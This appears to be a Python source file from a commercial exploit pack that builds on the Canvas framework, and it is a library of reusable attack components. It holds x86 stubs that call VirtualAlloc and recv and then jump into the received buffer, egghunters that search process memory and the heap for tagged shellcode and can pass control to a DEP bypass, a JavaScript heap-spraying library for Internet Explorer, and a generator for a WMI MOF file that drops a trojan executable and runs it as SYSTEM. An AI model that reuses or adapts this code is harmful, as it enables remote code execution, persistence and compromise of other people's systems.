
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
# This is the exploit code blocks library containing useful reusable chunks of code.
#
# Useful when having to build shellcode stubs
#
######################################################################################

"""
wp_exploitcodeblocks.py
"""

CHANGELOG="""

"""
######################################################################################

import os,getopt
import sys
import socket
from struct import *
from exploitutils import *
from encoder import *
from tcpexploit import *

import time

######################################################################################        
# wp_FixESPEBP
######################################################################################        
def wp_FixESPEBPP(size=1000):
    # White Phosphorus 
    # Subs size from ESP, fixes EBP as well
        
    data="""
    sub  $0x%x,%%esp
    add  $0x11111111,%%esp
    push %%esp
    pop %%ebp
    """%(0x11111111+size)

    code=mosdef.assemble(data,'x86')

    return code    

######################################################################################        
# wp_AlignStack
######################################################################################        
def wp_AlignStack(): 
    # White Phosphorus 
    # Simple stub to align the stack
    
    code = "\xB8\xF4\xFF\xFF\xFF\x21\xC4" # MOV EAX,-0C, AND ESP,EAX 

    return code

######################################################################################        
# wp_AppVirtualAlloc
######################################################################################        
def wp_AppVirtualAlloc(self,vaPTR):
    # White Phosphorus 
    # Make a call to VirtualAlloc() using the target applications import ptr
    # 
    # Pass the address of the function ptr into vaPTR
    # Example: CALL DWORD PTR DS:[<&KERNEL32.VirtualAll>; \VirtualAlloc
    #        ->CALL DWORD PTR DS:[4231F8]
    #        ->wp_AppVirtualAlloc(0x4231f8)
    self.log("WP> Building Target App VirtualAlloc() Codeblock")
    
    data="""
    movl $0x11111111,%%edi
    movl $0x%x,%%edx
    sub %%edi,%%edx
    sub $0x11110111,%%edi       # To make 0x1000
    xor %%eax,%%eax
    push $0x40                  # Protection
    push %%edi                  # Allocation Type 0x1000 MEM_COMMIT
    push %%edi                  # Size 0x1000 bytes
    push %%eax                  # Memory Address 0x00
    call (%%edx)                # Call VirtualAlloc Ptr
    """%(0x11111111+vaPTR)

    code=mosdef.assemble(data,'x86')
    
    self.log("WP> Target App VirtualAlloc() Size: %d Bytes" % len(code)) 
    return code  

######################################################################################        
# wp_AppRecv
######################################################################################        
def wp_AppRecv(self,recvPTR):
    # White Phosphorus 
    # Make a call to recv() using the target applications import ptr
    # and then jmps to the buffer
    # 
    # Pass the address of the function ptr into vaPTR
    # Example: CALL <JMP.&WS2_32.#16>                  ; \recv
    #        ->JMP DWORD PTR DS:[<&WS2_32.#16>]         ;  WS2_32.recv 
    #        ->JMP DWORD PTR DS:[42323C]
    #        ->wp_AppVirtualAlloc(0x42323C)
    self.log("WP> Building Target App recv() Codeblock")
    
    # recv loop, expects buffer in EAX, buffersize in EDI, Socket in ESI
        
    data="""
    mov %%eax,%%ebx             # Store buffer in ebx
    movl $0x%x,%%edx
    sub $0x11111111,%%edx       # Ptr to recv
    
    push %%edx
    recvloop:
    pop %%edx                   # Restore ptr to recv
    push %%edx                  # Store it for later
    xor %%eax,%%eax
    push %%eax                  # Flag 0x00
    push %%edi                  # Buffer size 
    push %%ebx                  # Buffer
    push %%esi                  # Socket
    call (%%edx)                # Call recv
    cmp $0xffffffff,%%eax
    je recvloop
    #.byte 0xcc
    jmp %%ebx                   # Jmp to the buffer
    """%(0x11111111+recvPTR)
    code=mosdef.assemble(data,'x86')
    
    self.log("WP> Target App recv() Size: %d Bytes" % len(code)) 
    return code   

######################################################################################        
# wp_SearchCode
######################################################################################        
def wp_SearchCode(isDEPBypass=False, prefix='',tag=0x6b303063): # Tag of 'c00k' in reverse to keep with Canvas standard
    # White Phosphorus 
    # When provided a known start pointer in EDX it will search for a TAG then exec
    #
    #   Uses NtAccessCheckAndAuditAlarm Syscall to locate pages, then search for tag
    #   Based on Skapes method
    #
    # Searching starts from EDX, so if you set this beforehand it can speed things up
    # This can be done with the prefix such as
    #   searchcode = wp_SearchCode(True,"mov %esi,%edx")
    #
    # This could be optimised.
        
    data=prefix + """
    xor %%dx,%%dx           // Zero it out
loop_inc_one:    
    incl %%edx              // increment pointer
loop_check:    
    push %%edx              // store it
    push $2                 // Push NtAccessCheckAndAuditAlarm
    pop %%eax               // pop it
    int $0x2e               // Syscall Time
    cmpb $0x5,%%al          // get error?
    pop %%edx               // restore it
    jne is_egg              // valid page
    incl %%edx              
    incl %%edx              // Spacers for
    incl %%edx              //  or $0x0fff, %%dx
    incl %%edx
    incl %%edx   
    jmp loop_inc_one        // Jmp back and try again
is_egg:
    mov $0x%x,%%eax         // our tag
    mov %%edx,%%edi         // load pointer into edi
    .byte 0xAF              // SCAS DWORD PTR ES:[EDI] // test it
    jnz loop_inc_one        // jump back if not here
    .byte 0xAF              // SCAS DWORD PTR ES:[EDI] // test 2nd tag
    jnz loop_inc_one        // jump back if not here
    """%(tag)
    
    if isDEPBypass:
        data +="""
        mov %edi,%esp	// Set up stack
        .byte 0xC3	// Return to dep bypass
        """
    else:
        data +="""
        jmp %edi	// jump to shellcode
        """

    code=mosdef.assemble(data,'x86')
    # Mosdef compiler doesn't like this for some reason so we do it here.
    # or $0x0fff, %%dx
    code = code.replace('\x42\x42\x42\x42\x42', '\x66\x81\xca\xff\x0f')


    return code  

    
######################################################################################        
# wp_SearchCodeHeap
######################################################################################        
def wp_SearchCodeHeap(isDEPBypass=False, tag=0x6b303063): # Tag of 'c00k' in reverse to keep with Canvas standard
    # White Phosphorus - Preferred Method
    #   This function is compatible with both x86 and x64(WOW64) systems
    #
    #   This Function iterates through the process heap segments looking for our tag
    #
    #   It does this by reading working through the uncomitted ranges of the heaps segments
        

    data="""
    // Heap Enumeration
    movl $0x%x,%%ebp             // our tag        
    """%(tag)
    data +="""
    xor %ecx,%ecx
    movb $0x30,%cl
    movl %fs:(%ecx),%edx     // Load HEAP array address from PEB
    lea 0x60(%edx),%esi  
    add $0x30,%esi
    lea 0x14(%esi),%edx
    push (%edx)
      
    cld // clear direction flag for lodsl/stosl
    movl (%esi),%esi   // Load ptr to heap array
    
    jmp LOAD_HEAP
    
TAG_SEARCH:
    sub $0x8,%ecx          // Adjust    
TAG_SEARCHER:    
    .byte 0x39
    .byte 0x2c              // CMP DWORD PTR DS:[ECX+EDI],EBP
    .byte 0x39           
    jne TAG_NOT_FOUND
    .byte 0x39
    .byte 0x6c              // CMP DWORD PTR DS:[ECX+EDI+4],EBP
    .byte 0x39
    .byte 0x04        
    je TAG_FOUND
TAG_NOT_FOUND:
    loop TAG_SEARCHER
    dec %ebx               // dec num of ranges
    .byte 0xC3              // Return    
TAG_FOUND:
    .byte 0x8D
    .byte 0x7C
    .byte 0x39              // LEA EDI,DWORD PTR DS:[ECX+EDI+8]
    .byte 0x08        
    
    
    """
    if isDEPBypass:
        data +="""
        mov %edi,%esp	// Set up stack
        .byte 0xC3	// Return to dep bypass
        """
    else:
        data +="""
        jmp %edi	// jump to shellcode
        """    
    
    data +="""
LOAD_HEAP:    
    lodsl               // Load heap ptr from heap array
    cmp $0x6,(%esp)    // Check OS Version
    push %esi          // Store it for later
    
    jb OLD_OS    
    
    lea 0x10(%eax),%esi   // Move to HEAP_SEGMENT location ptr

LOAD_SEGMENT:    
    .byte 0x8B
    .byte 0x7E              // MOV EDI,DWORD PTR DS:[ESI+C]
    .byte 0x0C              // Load heap base
    
    test %edi,%edi
    je NEXT_HEAP
        
    .byte 0x8B
    .byte 0x5E              // MOV EBX,DWORD PTR DS:[ESI+20]   ; Load num of ranges
    .byte 0x20          
    
    .byte 0x8B
    .byte 0x56              // MOV EDX,DWORD PTR DS:[ESI+2C]   ; Load first range Ptr
    .byte 0x2C          

LOAD_RANGE:    
    .byte 0x8B
    .byte 0x4A              // MOV ECX,DWORD PTR DS:[EDX+8] Load UCR Start
    .byte 0x08          
    
    sub %edi,%ecx         // Calulate offset
    
    call TAG_SEARCH   
   
    // Get here we didn't find it so move past UCR if applicable
    
    je NEXT_SEGMENT

    .byte 0x8B
    .byte 0x7A              // MOV EDI,DWORD PTR DS:[EDX+8]    ; Load next range start
    .byte 0x08          
    
    .byte 0x03
    .byte 0x7A              // ADD EDI,DWORD PTR DS:[EDX+C]    ; Add size of UCR
    .byte 0x0C          
    
    .byte 0x8B  
    .byte 0x52              // MOV EDX,DWORD PTR DS:[EDX+4]    ; Load next range ptr
    .byte 0x04          
    
    jmp LOAD_RANGE
NEXT_SEGMENT:    
    movl (%esi),%esi
    jmp LOAD_SEGMENT

NEXT_HEAP:
    pop %esi
    jmp LOAD_HEAP
    
OLD_OS:
    // EAX Holds current Heap
    lea 0x58(%eax),%esi  
LOAD_SEGMENT2:    
    lodsl               // Load Segment Ptr
    test %eax,%eax
    je NEXT_HEAP

    .byte 0x8B
    .byte 0x78          //MOV EDI,DWORD PTR DS:[EAX+18]     ; Load BASE Address
    .byte 0x18          
    
    .byte 0x8B
    .byte 0x58          // MOV EBX,DWORD PTR DS:[EAX+2C]    ; Load num of ranges
    .byte 0x2C
       
    cmp $0x1,%ebx      // Are there any ranges
    jnb USE_UCR
        
    .byte 0x8B
    .byte 0x48          // MOV ECX,DWORD PTR DS:[EAX+1C]
    .byte 0x1C          
    
    .byte 0x2B
    .byte 0x48          // SUB ECX,DWORD PTR DS:[EAX+28]
    .byte 0x28
    
    inc %ebx               // Need to increase this for decrease below
    xor %eax,%eax
    movb $0x10,%ah         // Set page size
    mul %ecx               // calculate length
    xchg %ecx,%eax        // Swap it
    jmp DO_SEARCH
USE_UCR:    
        
    .byte 0x8B
    .byte 0x50          // MOV EDX,DWORD PTR DS:[EAX+30]    ; Load ptr to UCR List
    .byte 0x30          
LOAD_UCR:    
    .byte 0x8B
    .byte 0x4A          // MOV ECX,DWORD PTR DS:[EDX+4]     ; Load UCR Start
    .byte 0x04          
    
    sub %edi,%ecx         // Calulate offset
DO_SEARCH:    
        
    call TAG_SEARCH

    je LOAD_SEGMENT2
    // Move past UCR to next block
    
    .byte 0x8B
    .byte 0x7A              // MOV EDI,DWORD PTR DS:[EDX+4]    ; Load next range start
    .byte 0x04          
    
    .byte 0x03
    .byte 0x7A              // ADD EDI,DWORD PTR DS:[EDX+8]    ; Add size of UCR
    .byte 0x08          
    
    mov (%edx),%edx
    
    jmp LOAD_UCR
    """
    

        

    code=mosdef.assemble(data,'x86')
   
    return code        

######################################################################################        
# wp_SearchCodeRange
######################################################################################        
def wp_SearchCodeRange(direction=0,isDEPBypass=False, prefix='',tag=0x6b303063): # Tag of 'c00k' in reverse to keep with Canvas standard
    # White Phosphorus 
    # When provided a known start pointer in EDX it will search for a TAG then exec
    #
    #   This just searches through the memory range pointed to by edx
    #       This was created due to the slowness of the int 2e method with lots of threads
    #
    #   You MUST set EDX to the valid range (such as the heap) before calling this
        
    data=prefix + """
    mov $0x%x,%%eax         // our tag
loop_inc_one:
    """%(tag)
    if (direction ==0):  #Fwd    
        data +="incl %edx              // increment pointer"
    else:
        data +="decl %edx             // decrement pointer"
        
    data += """
    
    mov %edx,%edi           // load pointer into edi
    .byte 0xAF              // SCAS DWORD PTR ES:[EDI] // test it
    jnz loop_inc_one        // jump back if not here
    .byte 0xAF              // SCAS DWORD PTR ES:[EDI] // test 2nd tag
    jnz loop_inc_one        // jump back if not here
    """
    
    if isDEPBypass:
        data +="""
        mov %edi,%esp	// Set up stack
        .byte 0xC3	// Return to dep bypass
        """
    else:
        data +="""
        jmp %edi	// jump to shellcode
        """

    code=mosdef.assemble(data,'x86')

    return code      
######################################################################################            
# wp_clientside_HeapLib
######################################################################################        
def wp_clientside_HeapLib(padding="%u0d0d"): # This is the padding string
    # White Phosphorus 
    # 
    # Modified Heaplib From Heap Feng Shui
    #
        
    HeapLib = """
// Modified HeapLib
function heapLib() {
}
heapLib.ie = function(maxAlloc, heapBase) {
    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);
    this.paddingStr = unescape("%s");
//    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
    while (4 + this.paddingStr.length + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    this.mem = new Array();
    this.flushOleaut32();
}
heapLib.ie.prototype.padding = function(len) {
    return this.paddingStr.substr(0, len);
}
heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {
    var size;

    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
//        this.mem[tag].push(this.padding((arg-6)));
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}
heapLib.ie.prototype.freeOleaut32 = function(tag) {
    delete this.mem[tag];
    CollectGarbage();
}
heapLib.ie.prototype.flushOleaut32 = function() {
    this.freeOleaut32("oleaut32");
    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}
heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    this.allocOleaut32(arg, tag);
}
heapLib.ie.prototype.free = function(tag) {
    this.freeOleaut32(tag);
    this.flushOleaut32();
}
heapLib.ie.prototype.gc = function() {
    CollectGarbage();
    this.flushOleaut32();
}
heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);
    this.free("freeList");
}
heapLib.ie.prototype.lookaside = function(arg, count) {
    var size;
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";
    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");
    var count = (count ? count : 1);
    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");
    this.free("lookaside");
}
"""%(padding)
   
    return HeapLib

######################################################################################        
# wp_SuspendThreads ( This is untested)
######################################################################################        
def wp_SuspendThreads(): 
    # White Phosphorus 
    # Just returns a SuspendThreads() shellcode stub
    
    sc = shellcodeGenerator.win32()
    sc.addAttr("findeipnoesp", {"subespval": 0})
    sc.addAttr("SuspendThreads", None)
    sc.standalone = 1       # ???
    rawshellcode=sc.get()

    return rawshellcode

######################################################################################        
# wp_GenerateMOF
######################################################################################   
def wp_GenerateMOF(binary):
    # White Phosphorus
    #
    # Returns all inclusive MOF payload that is auto executed with SYSTEM privs 
    # when dropped in %systemroot%\system32\wbem\mof\
    #
    # Code borrowed from Canvas\Exploits\ms10_061.py
    #
    # Required Params:
    #     binary = MOSDEF PE Trojan
    
    vbs=''
    for i in range(0,len(binary),8):
        vbs+='"binary = binary & \\"'
        for j in range(8):
            if (i+j)>=len(binary):
                break
            vbs+='%02x'%(ord(binary[i+j]))
            if (i+j)!=len(binary)-1:
                vbs+=','
        vbs+='\\"\\n"\n'
    vbs+='"tmp = Split(binary, \\",\\")\\n"\n'
    vbs+='"Set fso = CreateObject(\\"Scripting.FileSystemObject\\")\\n"\n'
    vbs+='"Set shell = CreateObject(\\"WScript.Shell\\")\\n"\n'
    vbs+='"userprofile = shell.ExpandEnvironmentStrings(\\"%USERPROFILE%\\")\\n"\n'
    vbs+='"path = userprofile & \\"\\\\\\" & \\"UsrPrf%d.exe\\"\\n"\n'%(random.randint(99,999))
    vbs+='"Set f = fso.CreateTextFile(path, True)\\n"\n'
    vbs+='"For i = 0 To UBound(tmp)\\n"\n'
    vbs+='"  b = Int(\\"&H\\" & tmp(i))\\n"\n'
    vbs+='"  f.Write Chr(b)\\n"\n'
    vbs+='"Next\\n"\n'
    vbs+='"f.Close\\n"\n'
    vbs+='"shell.Run Chr(34) & path & Chr(34), 7, false\\n"'

    mof="""#pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")

#pragma deleteclass("MyASEventConsumer", nofail)
#pragma deleteinstance("__EventFilter.Name=\\\"EF\\\"", nofail)
#pragma deleteinstance("ActiveScriptEventConsumer.Name=\\\"ASEC\\\"", nofail)

class MyASEventConsumer
{
	[key]string Name;
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
    Name = "ASEC";
    ScriptingEngine = "VBScript";    
    ScriptText =
SCRIPT;
};

instance of __EventFilter as $FILTER
{
    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
    Name = "EF";
    Query = "SELECT * FROM __InstanceCreationEvent"
        " WHERE TargetInstance.__class = \\"MyASEventConsumer\\"";
    QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding as $BINDING
{
    CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
    Filter = $FILTER;
    Consumer = $CONSUMER;
};

instance of MyASEventConsumer
{
     Name = "Trigger";
};
""".replace('SCRIPT',vbs)
    return mof


